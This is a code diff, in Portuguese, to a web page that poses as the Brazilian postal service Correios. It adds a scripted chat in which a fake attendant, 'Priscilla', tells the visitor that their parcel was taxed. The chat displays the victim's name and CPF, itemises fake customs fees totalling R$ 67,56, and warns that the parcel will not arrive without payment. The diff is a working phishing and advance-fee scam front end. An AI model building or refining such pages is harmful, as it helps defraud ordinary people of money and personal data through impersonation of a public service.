@@ -584,6 +584,71 @@
         margin-right: 0% !important;
       }
     }
+
+    /* Estilos para o chat */
+    #chat-container {
+      display: none;
+      max-width: 600px;
+      margin: 20px auto;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    .chat-message {
+      display: flex;
+      padding: 10px;
+      border-bottom: 1px solid #eee;
+    }
+
+    .avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      margin-right: 10px;
+      object-fit: cover;
+    }
+
+    .message-content {
+      flex: 1;
+    }
+
+    .message-sender {
+      font-weight: bold;
+      color: #003157;
+      margin-bottom: 5px;
+    }
+
+    .message-text {
+      color: #333;
+    }
+
+    .message-image {
+      max-width: 100%;
+      border-radius: 5px;
+      margin-top: 5px;
+    }
+
+    .chat-button {
+      background-color: #003157;
+      color: white;
+      border: none;
+      padding: 10px 15px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin: 10px;
+      display: block;
+      width: calc(100% - 20px);
+    }
+
+    .chat-button:hover {
+      background-color: #001a33;
+    }
+
+    .hidden {
+      display: none;
+    }
   </style>
 </head>
 
@@ -689,51 +754,51 @@
       </div>
 
       <section class="mt-3 p-4 w-95 max-w-1200" style="margin: 0 auto;">
-  <div class="container">
-    <div class="overlay">
-      <div class="overlay-text">
-        <!-- Blocos de informação com tamanho fixo -->
-        <p class="rotate" 
-           style="margin-top: 28%; 
-                  margin-right: 0%; 
-                  color: #464545 !important; 
-                  font-size: 6px !important;
-                  transform: rotateX(1.2deg) rotateY(55deg);" 
-           id="caixa-info-1">
-          NOME: <span id="pag-nome" style="color: #464545 !important;"></span><br>
-          CPF: <span id="pag-cpf" style="color: #464545 !important;"></span>
-        </p>
-        
-        <p class="rotate" 
-           style="margin-top: 10%; 
-                  color: #464545 !important; 
-                  font-size: 6px !important;
-                  transform: rotateX(1.2deg) rotateY(55deg);" 
-           id="caixa-info-2">
-          RUA: <span id="pag-rua" style="color: #464545 !important;"></span><br>
-          BAIRRO: <span id="pag-bairro" style="color: #464545 !important;"></span><br>
-          CIDADE: <span id="pag-cidade" style="color: #464545 !important;"></span>
-        </p>
-      </div>
-    </div>
-  </div>
-</section>
+        <div class="container">
+          <div class="overlay">
+            <div class="overlay-text">
+              <!-- Blocos de informação com tamanho fixo -->
+              <p class="rotate" 
+                 style="margin-top: 28%; 
+                        margin-right: 0%; 
+                        color: #464545 !important; 
+                        font-size: 6px !important;
+                        transform: rotateX(1.2deg) rotateY(55deg);" 
+                 id="caixa-info-1">
+                NOME: <span id="pag-nome" style="color: #464545 !important;"></span><br>
+                CPF: <span id="pag-cpf" style="color: #464545 !important;"></span>
+              </p>
+              
+              <p class="rotate" 
+                 style="margin-top: 10%; 
+                        color: #464545 !important; 
+                        font-size: 6px !important;
+                        transform: rotateX(1.2deg) rotateY(55deg);" 
+                 id="caixa-info-2">
+                RUA: <span id="pag-rua" style="color: #464545 !important;"></span><br>
+                BAIRRO: <span id="pag-bairro" style="color: #464545 !important;"></span><br>
+                CIDADE: <span id="pag-cidade" style="color: #464545 !important;"></span>
+              </p>
+            </div>
+          </div>
+        </div>
+      </section>
 
       <style>
-  /* Estilos para desktop */
-  @media (min-width: 768px) {
-    #caixa-info-1, #caixa-info-2 {
-      font-size: 6px !important;
-    }
-  }
-  
-  /* Estilos para mobile */
-  @media (max-width: 767px) {
-    #caixa-info-1, #caixa-info-2 {
-      font-size: 4.2px !important; /* Reduzido 30% para mobile */
-    }
-  }
-</style>
+        /* Estilos para desktop */
+        @media (min-width: 768px) {
+          #caixa-info-1, #caixa-info-2 {
+            font-size: 6px !important;
+          }
+        }
+        
+        /* Estilos para mobile */
+        @media (max-width: 767px) {
+          #caixa-info-1, #caixa-info-2 {
+            font-size: 4.2px !important; /* Reduzido 30% para mobile */
+          }
+        }
+      </style>
 
       <section class="px-4 py mb-5 w-95 max-w-1000" style="margin:0 auto;">
         <ul style="list-style: none; padding-left: 0;">
@@ -807,6 +872,58 @@
         <a href="#" id="voltar-rastreio">Voltar ao rastreamento</a>
       </div>
     </section>
+
+    <!-- Chat Container -->
+    <div id="chat-container">
+      <!-- Parte 1 - Exibida automaticamente -->
+      <div id="part1" class="chat-message">
+        <img src="avatar.png" alt="Atendente" class="avatar">
+        <div class="message-content">
+          <div class="message-sender">Priscilla</div>
+          <div class="message-text">Bem-vindo(a) ao atendimento Virtual dos Correios.</div>
+          <div class="message-text">Identificamos no nosso Sistema que uma de suas Encomendas Foi Taxada</div>
+          <img src="image1.png" alt="Imagem 1" class="message-image">
+          <div class="message-text"><span id="chat-nome"></span>, você deseja solicitar a liberação da sua mercadoria?</div>
+        </div>
+      </div>
+
+      <!-- Parte 2 - Exibida após clicar no botão SIM -->
+      <div id="part2" class="chat-message hidden">
+        <img src="avatar.png" alt="Atendente" class="avatar">
+        <div class="message-content">
+          <div class="message-sender">Priscilla</div>
+          <img src="image2.png" alt="Imagem 2" class="message-image">
+          <div class="message-text">Por que essa taxa?</div>
+          <div class="message-text">A taxa cobre os custos de liberação alfandegária e envio da sua encomenda. Ela inclui:</div>
+          <div class="message-text">- Taxa de liberação: Cobrança padrão para processos alfandegários.</div>
+          <div class="message-text">- Peso da mercadoria – Valor ajustado conforme o peso do item.</div>
+          <div class="message-text">- Despacho postal – Serviço de liberação e envio.</div>
+        </div>
+      </div>
+
+      <!-- Parte 3 - Exibida após clicar no botão "Entendi, continuar!" -->
+      <div id="part3" class="chat-message hidden">
+        <img src="avatar.png" alt="Atendente" class="avatar">
+        <div class="message-content">
+          <div class="message-sender">Priscilla</div>
+          <img src="image3.png" alt="Imagem 3" class="message-image">
+          <div class="message-text">GUIA DE PAGAMENTO GERADA COM SUCESSO!</div>
+          <div class="message-text">Taxa de Liberação: R$ 23,89</div>
+          <div class="message-text">Peso da mercadoria: R$ 19,50</div>
+          <div class="message-text">Despacho postal: R$ 24,17</div>
+          <div class="message-text">Total a Pagar: R$ 67,56</div>
+          <div class="message-text">Comprovante gerado com sucesso, caso não efetue o pagamento, a sua mercadoria não chegará até você.</div>
+          <div class="message-text">ATENÇÃO, <span id="chat-nome2"></span></div>
+          <div class="message-text">CPF: <span id="chat-cpf"></span></div>
+          <div class="message-text">Após a confirmação do pagamento, sua encomenda será liberada amanhã dia <span id="chat-data"></span></div>
+        </div>
+      </div>
+
+      <!-- Botões do chat -->
+      <button id="btn-sim" class="chat-button">SIM</button>
+      <button id="btn-continuar" class="chat-button hidden">Entendi, continuar!</button>
+      <button id="btn-acessar-guia" class="chat-button hidden">ACESSAR GUIA DE PAGAMENTO</button>
+    </div>
 
     <section class="my-4 w-95 max-w-1000" style="margin: 0 auto;">
       <div>
@@ -937,6 +1054,19 @@
       `;
     }
 
+    // Função para obter a data de amanhã
+    function getDataAmanha() {
+      const hoje = new Date();
+      const amanha = new Date(hoje);
+      amanha.setDate(hoje.getDate() + 1);
+      
+      const dd = amanha.getDate().toString().padStart(2, '0');
+      const mm = (amanha.getMonth() + 1).toString().padStart(2, '0');
+      const yyyy = amanha.getFullYear();
+      
+      return `${dd}/${mm}/${yyyy}`;
+    }
+
     let intervalContagem;
 
     document.getElementById("form-rastreamento").addEventListener("submit", async function (event) {
@@ -1031,8 +1161,14 @@
     
     // Script para o botão "Efetuar Pagamento"
     document.getElementById("btn-pagar").addEventListener("click", function() {
-      alert("Redirecionando para página de pagamento...");
-      // Aqui você pode adicionar o redirecionamento real para a página de pagamento
+      document.getElementById("pagamento").style.display = "none";
+      document.getElementById("chat-container").style.display = "block";
+      
+      // Preenche os dados no chat
+      document.getElementById("chat-nome").textContent = document.getElementById("res-nome").textContent;
+      document.getElementById("chat-nome2").textContent = document.getElementById("res-nome").textContent;
+      document.getElementById("chat-cpf").textContent = document.getElementById("res-cpf").textContent;
+      document.getElementById("chat-data").textContent = getDataAmanha();
     });
 
     // Máscaras para CPF e CEP
@@ -1048,6 +1184,30 @@
       let value = e.target.value.replace(/\D/g, '');
       if (value.length > 5) value = value.substring(0, 5) + '-' + value.substring(5);
       e.target.value = value.substring(0, 9);
+    });
+
+    // Lógica do chat
+    document.getElementById('btn-sim').addEventListener('click', function() {
+      document.getElementById('part2').classList.remove('hidden');
+      document.getElementById('btn-sim').classList.add('hidden');
+      document.getElementById('btn-continuar').classList.remove('hidden');
+      
+      // Rolagem automática para a parte 2
+      document.getElementById('part2').scrollIntoView({ behavior: 'smooth' });
+    });
+
+    document.getElementById('btn-continuar').addEventListener('click', function() {
+      document.getElementById('part3').classList.remove('hidden');
+      document.getElementById('btn-continuar').classList.add('hidden');
+      document.getElementById('btn-acessar-guia').classList.remove('hidden');
+      
+      // Rolagem automática para a parte 3
+      document.getElementById('part3').scrollIntoView({ behavior: 'smooth' });
+    });
+
+    document.getElementById('btn-acessar-guia').addEventListener('click', function() {
+      alert('Redirecionando para a página de pagamento...');
+      // Aqui você pode adicionar o redirecionamento real para a página de pagamento
     });
   </script>
 </body>
